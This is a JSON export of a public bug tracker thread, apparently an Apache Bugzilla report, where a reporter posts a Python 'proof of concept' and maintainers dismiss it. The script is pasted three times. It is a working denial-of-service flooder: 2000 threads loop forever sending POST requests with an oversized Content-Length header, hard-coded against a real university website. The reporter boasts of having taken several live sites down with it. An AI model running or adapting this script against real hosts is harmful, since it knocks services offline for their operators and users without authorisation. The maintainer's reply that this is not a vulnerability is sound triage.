[{"count": 0, "tags": [], "creator": "buch0b2@gmail.com", "attachment_id": 34819, "text": "Created attachment 34819\npoc\n\nfor num in range(2000):\n            buf += \"AAAAA\"\n        \n        headers = {'Content-Length': str(0xFFFFFFFFFFFF),'Content-Type': 'text/html'}\n\nif buffer is over 10000 size,allow to set arbitrary Content-Length. so looping program and slow connection or dead connection.\n\ntry to run poc.\n\nThanks.", "id": 197639, "time": "2017-03-14T05:46:23Z", "bug_id": 60860, "creation_time": "2017-03-14T05:46:23Z", "is_private": false}, {"count": 1, "tags": [], "creator": "buch0b2@gmail.com", "attachment_id": 34819, "is_private": false, "id": 197640, "time": "2017-03-14T09:05:03Z", "bug_id": 60860, "creation_time": "2017-03-14T09:05:03Z", "text": "Comment on attachment 34819\npoc\n\n> #! /usr/bin/env python\n> \n>import httplib,urllib\n>import time\n>import sys\n>import threading\n>import subprocess\n>import random\n> \n>aurl = \"\"\n>aport = 0\n>\n>def send_request(method, url, path):\n>    try:\n>\n>        c = httplib.HTTPConnection(url, aport)\n>        \n>        buf = \"\"\n>        for num in range(2000):\n>            buf += \"AAAAA\"\n>        \n>        headers = {'Content-Length': str(0xFFFFFFFFFFF),'Content-Type': 'text/html','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36'}\n>\n>        params = urllib.urlencode({'bitch': buf})\n>        c.request(method,path,body=params,headers=headers);\n>\n>        print c.getresponse().read()\n>        c.close()\n>    except Exception, e:\n>        print \"fuck\"\n>        pass\n>\n>def requests():\n>            while True:\n>             send_request(\"POST\", aurl, \"\")\n>         \n>aurl = \"www.kagawa-u.ac.jp\"\n>aport = 80\n>\n>for num in range(2000):\n> threading.Thread(target=requests).start()"}, {"count": 2, "tags": [], "bug_id": 60860, "text": "Comment on attachment 34819\npoc\n\n> #! /usr/bin/env python\n> \n>import httplib,urllib\n>import time\n>import sys\n>import threading\n>import subprocess\n>import random\n> \n>aurl = \"\"\n>aport = 0\n>\n>def send_request(method, url, path):\n>    try:\n>\n>        c = httplib.HTTPConnection(url, aport)\n>        \n>        buf = \"\"\n>        for num in range(2000):\n>            buf += \"AAAAA\"\n>        \n>        headers = {'Content-Length': str(0xFFFFFFFFFFF),'Content-Type': 'text/html','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36'}\n>\n>        params = urllib.urlencode({'bitch': buf})\n>        c.request(method,path,body=params,headers=headers);\n>\n>        print c.getresponse().read()\n>        c.close()\n>    except Exception, e:\n>        print \"fuck\"\n>        pass\n>\n>def requests():\n>            while True:\n>             send_request(\"POST\", aurl, \"\")\n>         \n>aurl = \"www.kagawa-u.ac.jp\"\n>aport = 80\n>\n>for num in range(2000):\n> threading.Thread(target=requests).start()", "id": 197641, "time": "2017-03-14T09:06:02Z", "creator": "buch0b2@gmail.com", "creation_time": "2017-03-14T09:06:02Z", "is_private": false, "attachment_id": 34819}, {"count": 3, "tags": [], "creator": "buch0b2@gmail.com", "is_private": false, "text": "Comment on attachment 34819\npoc\n\n> #! /usr/bin/env python\n> \n>import httplib,urllib\n>import time\n>import sys\n>import threading\n>import subprocess\n>import random\n> \n>aurl = \"\"\n>aport = 0\n>\n>def send_request(method, url, path):\n>    try:\n>\n>        c = httplib.HTTPConnection(url, aport)\n>        \n>        buf = \"\"\n>        for num in range(2000):\n>            buf += \"AAAAA\"\n>        \n>        headers = {'Content-Length': str(0xFFFFFFFFFFF),'Content-Type': 'text/html','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36'}\n>\n>        params = urllib.urlencode({'bitch': buf})\n>        c.request(method,path,body=params,headers=headers);\n>\n>        print c.getresponse().read()\n>        c.close()\n>    except Exception, e:\n>        print \"fuck\"\n>        pass\n>\n>def requests():\n>            while True:\n>             send_request(\"POST\", aurl, \"\")\n>         \n>aurl = \"www.kagawa-u.ac.jp\"\n>aport = 80\n>\n>for num in range(2000):\n> threading.Thread(target=requests).start()", "id": 197642, "time": "2017-03-14T09:07:17Z", "bug_id": 60860, "creation_time": "2017-03-14T09:07:17Z", "attachment_id": 34819}, {"count": 4, "tags": [], "creator": "buch0b2@gmail.com", "text": "Created attachment 34820\npoc2\n\npoc2", "id": 197643, "time": "2017-03-14T09:10:49Z", "bug_id": 60860, "creation_time": "2017-03-14T09:10:49Z", "is_private": false, "attachment_id": 34820}, {"count": 5, "attachment_id": 34821, "bug_id": 60860, "is_private": false, "id": 197645, "time": "2017-03-14T09:17:31Z", "creator": "buch0b2@gmail.com", "creation_time": "2017-03-14T09:17:31Z", "tags": [], "text": "Created attachment 34821\nimage\n\nimage of poc"}, {"count": 6, "tags": [], "creator": "buch0b2@gmail.com", "attachment_id": null, "text": "please look poc2.poc was missed", "id": 197646, "time": "2017-03-14T09:18:59Z", "bug_id": 60860, "creation_time": "2017-03-14T09:18:59Z", "is_private": false}, {"count": 7, "tags": [], "text": "idk is it a bug... sorry i am noob man", "is_private": false, "bug_id": 60860, "id": 197647, "time": "2017-03-14T09:28:05Z", "creator": "buch0b2@gmail.com", "creation_time": "2017-03-14T09:28:05Z", "attachment_id": null}, {"count": 8, "tags": [], "creator": "covener@gmail.com", "text": "yes, 2000 threads in an application that buffers large inputs is expensive, but we don't consider it a vulnerability in the server.  We also don't expect vulnerabilities to be reported on public bugzilla.", "id": 197655, "time": "2017-03-14T11:42:55Z", "bug_id": 60860, "creation_time": "2017-03-14T11:42:55Z", "is_private": false, "attachment_id": null}, {"count": 9, "tags": [], "creator": "buch0b2@gmail.com", "text": "(In reply to Eric Covener from comment #8)\n> yes, 2000 threads in an application that buffers large inputs is expensive,\n> but we don't consider it a vulnerability in the server.  We also don't\n> expect vulnerabilities to be reported on public bugzilla.\n\nhey girl,please remove 'Content-Length': str(0xFFFFFFFFFFF), from headers\n\nand try it out. don't down.if you add 'Content-Length': str(0xFFFFFFFFFFF), to headers if site will down(if you try it on localhost,will down)", "id": 197656, "time": "2017-03-14T12:02:54Z", "bug_id": 60860, "creation_time": "2017-03-14T12:02:54Z", "is_private": false, "attachment_id": null}, {"text": "i already tried this poc on any sites,these were down!\nit's bug!", "tags": [], "bug_id": 60860, "is_private": false, "count": 10, "id": 197657, "time": "2017-03-14T12:04:14Z", "creator": "buch0b2@gmail.com", "creation_time": "2017-03-14T12:04:14Z", "attachment_id": null}, {"count": 11, "tags": [], "bug_id": 60860, "is_private": false, "text": "Movie:https://www.youtube.com/watch?v=acQrNO5g1Qo", "id": 197736, "time": "2017-03-17T02:42:44Z", "creator": "buch0b2@gmail.com", "creation_time": "2017-03-17T02:42:44Z", "attachment_id": null}, {"count": 12, "tags": [], "bug_id": 60860, "text": "oops it's not a bug sorry plz close", "id": 197994, "time": "2017-03-25T16:22:39Z", "creator": "buch0b2@gmail.com", "creation_time": "2017-03-25T16:22:39Z", "is_private": false, "attachment_id": null}, {"count": 13, "tags": [], "bug_id": 60860, "text": "Closing per reporter comment #12", "id": 198213, "time": "2017-04-07T20:02:08Z", "creator": "wrowe@apache.org", "creation_time": "2017-04-07T20:02:08Z", "is_private": false, "attachment_id": null}]